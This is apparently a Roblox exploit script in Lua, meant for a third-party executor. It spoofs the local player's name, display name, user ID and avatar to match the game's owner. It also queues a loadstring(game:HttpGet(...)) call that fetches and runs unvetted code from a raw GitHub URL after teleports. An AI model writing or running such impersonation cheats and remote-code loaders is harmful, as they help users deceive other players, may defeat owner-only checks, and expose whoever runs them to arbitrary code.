-- Only execute if not already spoofed
if getgenv().IdentitySpoofed then return end
getgenv().IdentitySpoofed = true

local Players = game:GetService("Players")
local LP = Players.LocalPlayer

local function getOwnerId()
    if game.CreatorType == Enum.CreatorType.Group then
        -- If group owned, get the group owner's ID via API or GroupService
        local groupInfo = game:GetService("GroupService"):GetGroupInfoAsync(game.CreatorId)
        return groupInfo.Owner.Id
    else
        -- If user owned
        return game.CreatorId
    end
end

local function applySpoof()
    local success, ownerId = pcall(getOwnerId)
    if not success then ownerId = game.CreatorId end -- Fallback

    -- Fetch owner's Name and DisplayName
    local ownerName = Players:GetNameFromUserIdAsync(ownerId)
    local ownerDisplayName = ownerName -- Default

    -- Attempt to get the actual DisplayName
    pcall(function()
        local userInfo = game:GetService("UserService"):GetUserInfosByUserIdsAsync({ownerId})
        if userInfo and userInfo[1] then
            ownerDisplayName = userInfo[1].DisplayName
        end
    end)

    -- Spoofing properties locally
    LP.Name = ownerName
    LP.DisplayName = ownerDisplayName
    LP.UserId = ownerId
    
    -- Optional: Spoof Character Appearance
    LP.CharacterAppearanceId = ownerId
end

-- Run the spoof
task.spawn(function()
    pcall(applySpoof)
end)

-- Re-apply on teleport/auto-execute if needed
if queue_on_teleport then
    queue_on_teleport([[
        loadstring(game:HttpGet("https://raw.githubusercontent.com/SylaHubAccount/Saved/refs/heads/main/ldgtmhd"))()
    ]])
end
